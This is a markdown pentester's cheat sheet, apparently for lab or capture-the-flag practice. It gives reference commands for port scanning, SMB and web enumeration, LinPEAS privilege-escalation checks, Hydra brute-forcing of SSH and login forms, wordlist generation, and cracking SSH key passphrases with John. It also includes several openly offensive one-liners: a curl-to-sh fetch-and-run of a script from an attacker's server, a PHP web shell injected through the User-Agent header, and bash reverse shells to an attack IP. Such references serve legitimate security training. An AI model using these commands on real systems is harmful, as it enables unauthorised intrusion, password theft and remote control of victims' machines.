# Pentester's Cheat Sheet
Quick reference guide to all things pentest.



## Enumeration/Recon
### Nmap
Let's look for those open ports and export the output to a specified directory using `nmap`.
```
nmap -sV -sC -vv -oN ./scan [ip_address]
```

### Dirb
DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the responses. DIRB’s main purpose is to help in professional web application auditing. 
```
dirb http://[ip or domain name]/[optional directories] [path_to_wordlist]
```

### SMBMap
SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.
```
smbmap -H [ip_address]
```
If an error is returned, try the `-u` switch and declare a username.
```
smbmap -H [ip_address] -u test
```

### LinPEAS
LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.
```
# 1. Copy over the LinPEAS script over OpenSSH using ~scp~ 
scp [LinPEAS_file_path] [user]@[ip_address]:[file_path] <-- Psst! /dev/shm is a great place

# 2. Change directory to ensure file transfer was successful and set file as executable 
chmod +x [file_name].sh

# 3. Now its time to let LinPEAS work its magic and find some escalation vectors. Run the following:
./linpeas.sh | tee linlog.txt

For more information, check out LinPEAS Github: https://github.com/carlospolop/PEASS-ng/
```

Alternatively.. you can start spin up a python server by spinning up a Python server where your linPEAS file is stored:
```
python3 -m http.server
```
Then in your reverse shell, make a call back to your Python server user cURL:
```
curl -L http:/10.2.45.175/linpeas.sh | sh
```

## Cracking
### Hydra
Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.

> Hydra ssh
```
hydra -l [username] -P [wordlist] [ip_address] ssh
```

> Hydra http-post-form
```
hydra -l [username] -P [path_to_wordlist] [target_ip] http-post-form "/[directory]:[user_param]=^USER^&[password_param]=^PASS^:[error_message]"
```
```
hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS^:ERROR_MESSAGE" -s 8000
```
Command Above explained:
- `-l` '' indicates that the login name is blank as the security lock only requires a password
- `-P` 3digits.txt specifies the password file to use
- `-f` stops Hydra after finding a working password
- `-v` provides verbose output and is helpful for catching errors
- `MACHINE_IP` is the IP address of the target
- `http-post-form` specifies the HTTP method to use
- `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
- `/login.php` is the page where the PIN code is submitted
- `pin=^PASS^` will replace ^PASS^ with values from the password list
- `Error_Message` indicates that invalid passwords will lead to a page that contains the text “Access denied”
- `-s 8000` indicates the port number on the target
### Crunch
Crunch can create a wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.
```
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```
The command above specifies the following:
- 3 the first number is the minimum length of the generated password
- 3 the second number is the maximum length of the generated password
- 0123456789ABCDEF is the character set to use to generate the passwords
- 3digits.txt saves the output to the 3digits.txt file
### CeWL
- Specify spidering depth: The ```-d``` option allows you to set how deep CeWL should spider. For example, to spider two links deep: ```cewl http://10.10.203.161 -d 2 -w output1.txt```
- Set minimum and maximum word length: Use the -m and -x options respectively. For instance, to get words between 5 and 10 characters: ```cewl http://10.10.203.161 -m 5 -x 10 -w output2.txt```
- Handle authentication: If the target site is behind a login, you can use the ```-a``` flag for form-based authentication.
- Custom extensions: The ```--with-numbers``` option will append numbers to words, and using ```--extension``` allows you to append custom extensions to each word, making it useful for directory or file brute-forcing.
- Follow external links: By default, CeWL doesn't spider external sites, but using the ```--offsite``` option allows you to do so.


### John
John the Ripper is a tool designed to help systems administrators to find weak (easy to guess or crack through brute force) passwords, and even automatically mail users warning them about it, if it is desired.

Run private SSH key against ssh2john to produce a new hash file. Next, crack the hash using specified wordlist. This should provid 
a password for password protected private keys. 

> ssh2john

For password protected private keys, convert the RSA key into a readable hash file for John to crack. 
```
ssh2john [key_id_rsa] > [new_file_name]
```
> John
```
john [path_to_file] --wordlist=[path to wordlist]
```
### Stegcracker
Steganography brute-force utility to uncover hidden data inside files.
```
stegcracker [path_to_image] [path_to_wordlist]
```

## Exploits
### SearchSploit
Exploit Database Archive Search After locating the exploit, copy it into the current directory.
```
searchsploit -m [exploit_file_path]
```



## Basic Linux Commands

- List directory, show hidden, and permissions files
```
ls -la
```

- Change Permissions for a file or directory:
```
chmod ### [file] or [directory]
```

- Need to change a file to an executable?
```
chmod +x [path_to_file | file_name]
```

- Another way of changing permissions over a directory is:
```
chown [user_name] [dir]
```

- Find files with SUID bit set:
```
find / -perm /4000 or find / -perm -u=s -type f 2>/dev/null
```
> Or (if using is in sudoers file).
```
sudo -l
```

- Open and listen on a port using `nc`. Now you're ready to execute that reverse shell.
```
nc -lvp [port_number]
```

- Connect to Samba share using `smbclient`:
```
smbclient \\\\[ip]\\[share]
```


## Basic Windows Commmands
- List user with privileges
```
whoami /priv
```



## Random Tips & Tricks
### RSA Keys
RSA Keys only like to be read by authenticated Users. Groups and others.. not so much. Be sure to change permissions to:
```
chmod 600 [RSA_Key_file_name]
```

### User Agents
Somestimes PHP can be passed in through request headers, specifically the User-Agent. If successful we can pass in an ecoded web shell one-liner via the `c` parameter. 
```
curl [ip or domain name] -H "User-Agent:<?php system(\$_GET['c']); ?>"
```

### Interactive Shell
Maybe you need to switch users, maybe you prefer BASH - either way you need to spawn an interactive shell. Also, `echo $0` will inform you of which shell you're currently using. 
```
python -c "import pty;pty.spawn('/bin/bash')"
```

### Python HTTP Server
```
sudo python -m http.server 80
```

### Bash Reverse Shell
```
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
```
> If there's a script that is executed by root, modifing the script file may be a privileg escalation vector:
```
bash -i >& /dev/tcp/[attack_ip]/[attack_port] 0>&1; 
```

### Decode Base64
```
 echo [base64_string] | base64 -d
```
